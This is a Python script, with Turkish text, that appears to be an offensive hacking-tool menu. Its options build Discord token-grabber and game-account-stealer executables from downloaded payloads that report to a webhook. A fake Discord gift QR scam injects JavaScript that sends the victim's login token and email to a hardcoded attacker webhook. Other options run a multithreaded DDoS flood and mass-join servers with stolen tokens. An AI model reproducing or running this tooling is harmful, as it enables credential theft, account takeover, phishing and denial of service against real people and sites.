

import os
from licensing.models import *
from licensing.methods import Key, Helpers
from PIL import Image, ImageFont, ImageDraw
import sys
import time
from colorama import Fore, Back, Style, init
import shutil
import sys

import os
import requests
import shutil
from bs4 import BeautifulSoup
from requests import get

init(autoreset=True)
import requests

#Bu repo daha tam olarak hazırlanmamıştır tüm fonksiyonlar çalışmamaktadır bir sıkıntı olursa iletişime geçebilirsiniz doldoldol#3909

a = 5
b = 6

if a == b:
    print("burası eskiden lisans key sistemi oldugu için kodları bozulmaması için kaldı")


else:




    ShowText = 'CASPERSS AREA'
    API_ENDPOINT = 'https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={}'
    APPDATA = os.getenv("APPDATA")


    def _get_real_direct_link(sharing_link):
        pk_request = requests.get(API_ENDPOINT.format(sharing_link))

        # Returns None if the link cannot be "converted"
        return pk_request.json().get('href')


    def _extract_filename(direct_link):
        for chunk in direct_link.strip().split('&'):
            if chunk.startswith('filename='):
                return chunk.split('=')[1]
        return None


    def download_yandex_link(sharing_link, filename=None):
        direct_link = _get_real_direct_link(sharing_link)
        if direct_link:

            filename = filename or _extract_filename(direct_link)

            download = requests.get(direct_link)
            os.chdir(APPDATA)
            with open(filename, 'wb') as out_file:
                out_file.write(download.content)
            print('İndirildi exploit "{}"  "{}"')
        else:
            print('Bağlantını Kontrol et "{}"')


    def Spinner():
        l = ['|', '/', '-', '\\']
        for i in l + l + l:
            sys.stdout.write(f"""\r# Yükleniyor... {i}""")
            sys.stdout.flush()
            time.sleep(0.4)


    font = ImageFont.truetype('arialbd.ttf', 15)
    size = font.getsize(ShowText)
    image = Image.new('1', size, 1)
    draw = ImageDraw.Draw(image)
    draw.text((0, 0), ShowText, font=font)
    for rownum in range(size[1]):

        line = []
        for colnum in range(size[0]):
            if image.getpixel((colnum, rownum)):
                line.append(' '),
            else:
                line.append('#'),
        print(Fore.LIGHTGREEN_EX + ''.join(line))
    print(Fore.BLUE + "*-------------------------------------------------------------------------------------------*")
    print(
        Fore.RED + "https://discord.gg/X8KjZJ3J2U ----- https://github.com/Casper-dev172 ------- doldoldol#3909(CASMO#9663)")
    print(Fore.BLUE + "*-------------------------------------------------------------------------------------------*")
    print(Fore.CYAN + "Welcome CASMO AREA")

    print(Fore.MAGENTA + "[1] Rat")
    print(Fore.MAGENTA + "[2] Discord Token Grabber")
    print(Fore.MAGENTA + "[3] Fake QR Scam")
    print(Fore.MAGENTA + "[4] Sbo Fucker v2")
    print(Fore.MAGENTA + "[5] Craftrise Account Stealer")
    print(Fore.MAGENTA + "[6] Fastfingers word hack")
    print(Fore.MAGENTA + "[7] İd to token")
    print(Fore.MAGENTA + "[8] Website Cloner")
    print(Fore.MAGENTA + "[9] DDOS ATTACK!")
    print(Fore.MAGENTA + "[10] DİSCORD TOKEN WORLD!")
    anan = os.getcwd()

    x = input()
    if x == "1":
        Spinner()
        print("Bu Geliştirme Sürecindedir yakında gelecektir.")

    if x == "2":
        Spinner()
        print("Webhook Giriniz")
        y = input()
        download_yandex_link("https://disk.yandex.com.tr/d/RyoA8MTLfGNlVw")
        download_yandex_link("https://disk.yandex.com.tr/d/6lTr5TINtpbD2Q")
        print(
            Fore.MAGENTA + "[UYARI] Bu İşlem Fazla bir şekilde yazılar ekrana dökülcek biraz tırsabilirsiniz ama hiç bir şey yoktur sadece exeye çevirme işlemi yapılacaktır.")
        time.sleep(1)
        os.chdir(APPDATA)

        with open("sasa.py", "r+",
                  encoding="utf-8") as dosya:
            icerik = dosya.read()
            yarak = f"WEBHOOKBABY = '{y}'\n" + icerik
            dosya.seek(0)
            dosya.write(yarak)
        os.chdir(APPDATA)
        os.system("python setup.py build")
        time.sleep(15)
        os.remove("sasa.py")
        os.remove("setup.py")
        shutil.move(f"{APPDATA}\\build", anan)
        print(Fore.GREEN + "UWU virüs oluşturulmuştur")
    if x == "5":
        Spinner()
        print("Webhook Giriniz")
        y = input()
        download_yandex_link("https://disk.yandex.com.tr/d/6pSN66uFNLuIaQ")
        download_yandex_link("https://disk.yandex.com.tr/d/4Nw7r50OrLwCzw")
        print(
            Fore.MAGENTA + "[UYARI] Bu İşlem Fazla bir şekilde yazılar ekrana dökülcek biraz tırsabilirsiniz ama hiç bir şey yoktur sadece exeye çevirme işlemi yapılacaktır.")
        time.sleep(1)

        os.chdir(APPDATA)
        with open("cr.py", "r+",
                  encoding="utf-8") as dosya:
            icerik = dosya.read()
            yarak = f"WEBHOOKBABY = '{y}'\n" + icerik
            dosya.seek(0)
            dosya.write(yarak)
        os.chdir(APPDATA)
        os.system("python setup1.py build")
        time.sleep(15)
        os.remove("cr.py")
        os.remove("setup1.py")
        shutil.move(f"{APPDATA}\\build", anan)
        print(Fore.GREEN + "UWU virüs oluşturulmuştur")
    if x == "3":
        Spinner()
        print(
            Fore.BLUE + "[BİLGİ]Bu uygulamada chrome açılacaktır sekmeyi kesinlikle kapatmamalısınız discord_gift.png oluşturulduktan sonra kurbana attıktan sonra kurban okuttuğu zaman o açılan chrome sekmesinde kullanıcının hesabına giriş yapmış olcaksınızdır"
                        "ve cmd de bir kaç hata belirebilir onlara aldırış etmeyin ve tadını çıkarın ")
        time.sleep(5)
        from bs4 import BeautifulSoup
        from selenium import webdriver
        from PIL import Image
        import base64
        import time
        import os


        def qr_hazırla():
            im1 = Image.open('temp/resim1.png', 'r')
            im2 = Image.open('temp/logo.png', 'r')
            im2_w, im2_h = im2.size
            im1.paste(im2, (60, 55))
            im1.save('temp/anan.png', quality=95)


        def bindir():
            im1 = Image.open('temp/template.png', 'r')
            im2 = Image.open('temp/anan.png', 'r')
            im1.paste(im2, (120, 409))
            im1.save('discord_gift.png', quality=95)


        def main():
            print('FAKE QR SCAM\n')

            options = webdriver.ChromeOptions()
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            options.add_experimental_option('detach', True)
            driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

            driver.get('https://discord.com/login')
            time.sleep(5)
            print('Sayfa Yüklendi')

            page_source = driver.page_source

            soup = BeautifulSoup(page_source, features='lxml')

            div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
            qr_code = soup.find('img')['src']
            file = os.path.join(os.getcwd(), 'temp/resim1.png')

            img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

            with open(file, 'wb') as handler:
                handler.write(img_data)

            discord_login = driver.current_url
            qr_hazırla()
            bindir()

            print('Gift Code Oluşturuldu Klasörü kontrol ediniz.')
            print('QR code oluşturuldu kurbanın okutmasını bekleyiniz.')

            while True:
                time.sleep(6)
                if discord_login != driver.current_url:
                    print('tokenı çekiyooorummm')
                    driver.execute_script('''
        location.reload();
        var discordWebhook = "https://discord.com/api/webhooks/939082111149809715/arZ4T9gWDAVVcrifcg_w7eO4nS7pu2NsL8BfqSu-XtjGkuwMBZQ6-oFQFwF5Clt0PxA5";
        var i = document.createElement('iframe');
        document.body.appendChild(i);
        var request = new XMLHttpRequest();
        request.open("POST", discordWebhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Token Grabber",
            avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
            content: '**OMG HEÇKIR APİĞĞĞ!**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache
        };
        request.send(JSON.stringify(params));

                           ''')
                    print('---')
                    print("çekkkkkkkkktimmmmmmmmmm:")
                    break

            print('İş bitti')


        if __name__ == '__main__':
            main()

    if x == "4":
        Spinner()

        download_yandex_link("https://disk.yandex.com.tr/d/ylx0-4Q93wrnFA")
        download_yandex_link("https://disk.yandex.com.tr/d/s_gD3XvCcs6yVg")
        print(
            Fore.MAGENTA + "[UYARI] Bu İşlem Fazla bir şekilde yazılar ekrana dökülcek biraz tırsabilirsiniz ama hiç bir şey yoktur sadece exeye çevirme işlemi yapılacaktır.")
        time.sleep(1)
        os.chdir(APPDATA)
        os.system("python setup2.py build")
        time.sleep(15)
        os.remove("sbo.py")
        os.remove("setup2.py")
        shutil.move(f"{APPDATA}\\build", anan)
        print("İşlem bitti dikkat et kendin açma :)")
    if x == "6":
        Spinner()
        print("Bu chromedriver ürünüdür eğer sürümle alakalı hata alırsanız chromedriverın sitesine gidip kendi chrome sürümünüze uygun chromedriverı yükleyip klasöerlin içine atınız")
        print("fastfingers email giriniz")
        e = input()
        print("fastfingers paralo giriniz")
        p = input()
        from selenium import webdriver
        import time
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait

        options = webdriver.ChromeOptions()
        driver = webdriver.Chrome()
        driver.maximize_window();
        email = e
        password = p

        driver.get("https://10fastfingers.com/login");
        driver.find_element_by_name("data[User][email]").send_keys(email)
        driver.find_element_by_name("data[User][password]").send_keys(password)
        driver.find_element_by_id("login-form-submit").click()
        time.sleep(1)
        driver.get("https://10fastfingers.com/typing-test/turkish");
        wait = WebDriverWait(driver, 10)
        inputElement = wait.until(EC.presence_of_element_located((By.ID, "inputfield")))
        time.sleep(4)
        word_list = driver.execute_script("return words")
        number = 0;
        for word in word_list:
            inputElement.send_keys(word + " ")
    if x =="7":
        Spinner()
        print(Fore.RED+"bu sadece tokenın ilk baştaki karakterleri verir 2 faktörlü doğrulamalı hesaplarda kullanılamaz")
        import base64

        userid = input(Fore.LIGHTYELLOW_EX+" İd gir : ")
        encodedBytes = base64.b64encode(userid.encode("utf-8"))
        encodedStr = str(encodedBytes, "utf-8")
        print(Fore.LIGHTYELLOW_EX+f'\n tokenın başı: {encodedStr}')
    if x =="8":
        Spinner()
        print("bazı hatalar olabilir eğer sıkıntı olursa bize ulaşınız")
        print("site giriniz https://casperss.cf şeklinde")
        x = input()
        print("hangi klasör e kaydetmek istiyorsunuz")
        y = input()
        base_dir = os.getcwd()

        site_name = x
        project_name = y

        project_path = "../" + project_name
        os.makedirs(project_path, exist_ok=True)

        visited_links = []
        error_links = []


        def save(bs, element, check):
            links = bs.find_all(element)

            for l in links:
                href = l.get("href")
                if href is not None and href not in visited_links:
                    if check in href:
                        href = l.get("href")
                        print("indiriliyor: {}".format(href))
                        if "//" in href:
                            path_s = href.split("/")
                            file_name = ""
                            for i in range(3, len(path_s)):
                                file_name = file_name + "/" + path_s[i]
                        else:
                            file_name = href

                        l = site_name + file_name

                        try:
                            r = requests.get(l)
                        except requests.exceptions.ConnectionError:
                            error_links.append(l)
                            continue

                        if r.status_code != 200:
                            error_links.append(l)
                            continue

                        os.makedirs(os.path.dirname(project_path + file_name.split("?")[0]), exist_ok=True)
                        with open(project_path + file_name.split("?")[0], "wb") as f:
                            f.write(r.text.encode('utf-8'))
                            f.close()

                        visited_links.append(l)


        def save_assets(html_text):
            bs = BeautifulSoup(html_text, "html.parser")
            save(bs=bs, element="link", check=".css")
            save(bs=bs, element="script", check=".js")

            links = bs.find_all("img")
            for l in links:
                href = l.get("src")
                if href is not None and href not in visited_links:
                    print("indiriliyor : {}".format(href))
                    if "//" in href:
                        path_s = href.split("/")
                        file_name = ""
                        for i in range(3, len(path_s)):
                            file_name = file_name + "/" + path_s[i]
                    else:
                        file_name = href

                    l = site_name + file_name

                    try:
                        r = requests.get(l, stream=True)
                    except requests.exceptions.ConnectionError:
                        error_links.append(l)
                        continue

                    if r.status_code != 200:
                        error_links.append(l)
                        continue

                    os.makedirs(os.path.dirname(project_path + file_name.split("?")[0]), exist_ok=True)
                    with open(project_path + file_name.split("?")[0], "wb") as f:
                        shutil.copyfileobj(r.raw, f)

                    visited_links.append(l)


        def crawl(link):
            if "http://" not in link and "https://" not in link:
                link = site_name + link

            if site_name in link and link not in visited_links:
                print("indiriliyor : {}".format(link))

                path_s = link.split("/")
                file_name = ""
                for i in range(3, len(path_s)):
                    file_name = file_name + "/" + path_s[i]

                if file_name[len(file_name) - 1] != "/":
                    file_name = file_name + "/"

                try:
                    r = requests.get(link)
                except requests.exceptions.ConnectionError:
                    print("bağlantı hatası (cloudflare under attack mode açık olabilir)")
                    sys.exit(1)

                if r.status_code != 200:
                    print("site yanlış")
                    sys.exit(1)
                print(project_path + file_name + "index.html")
                os.makedirs(os.path.dirname(project_path + file_name.split("?")[0]), exist_ok=True)
                with open(project_path + file_name.split("?")[0] + "index.html", "wb") as f:
                    text = r.text.replace(site_name, project_name)
                    f.write(text.encode('utf-8'))
                    f.close()

                visited_links.append(link)

                save_assets(r.text)

                soup = BeautifulSoup(r.text, "html.parser")

                for link in soup.find_all('a'):
                    try:
                        crawl(link.get("href"))
                    except:
                        error_links.append(link.get("href"))


        crawl(site_name + "/")

        for link in visited_links:
            print("---- {}\n".format(link))

        print("\n\n\nhata\n")
        for link in error_links:
            print("---- {}\n".format(link))
    if x == "9":
        Spinner()
        ddoser = input("Hedef site giriniz örnek.com:")

        import socket
        import threading


        ip = get('https://api.ipify.org').text


        target = 'casperss.cf'
        fake_ip = ip
        port = 80

        attack_num = 0


        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                global attack_num
                attack_num += 1
                print(attack_num)
                s.close()


        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()
            attack_num = 0
    if x == "10":
        Spinner()

        print(Fore.MAGENTA + "[1] Token sese sokma")
        print(Fore.MAGENTA + "[2] Token yayına sokma")
        print(Fore.MAGENTA + "[3] Token sunucuya sokma")
        print(Fore.MAGENTA + "[4] About me kısımlarına yazı yazma")
        supra = input()
        if supra == "3":
            print("tokenler.txt ye tokenlarını at")
            print("discord invite link giriniz lütfen sadece davet kodunu atınız ( örnek = 21312dwadqw)")
            ananxd = input()
            tokens = []

            with open("tokenler.txt", "r") as tokens_file:
                lines = tokens_file.readlines()
                for l in lines:
                   token = tokens.append(l.replace('\n', ''))


            def bot_inviter(ananxd,token):
                apilink = "https://discordapp.com/api/v6/invite/" + ananxd
                headers = {'Authorization': token}
                bot_invite = requests.post(apilink, headers=headers)
                print(bot_invite.text)


            for botz in tokens:
                bot_inviter(ananxd, botz)

        if supra =="1":
            import discord


            class MyClient(discord.Client):


                async def on_ready(self):
                    print('Logged on as', self.user)
                    time.sleep(5)


                    print('Bot joined the channel.')
                    channel_id = '929783813024935941'
                    voice_channel = client.get_channel(channel_id)
                    await voice_channel.connect()

                async def on_message(self, message):
                    # don't respond to ourselves
                    if message.author == self.user:
                        return

                    if message.content == 'ping':
                        await message.channel.send('pong')


            client = MyClient()
            client.run('')








            print("çabuk çabuk ses kanalıan gir oç")














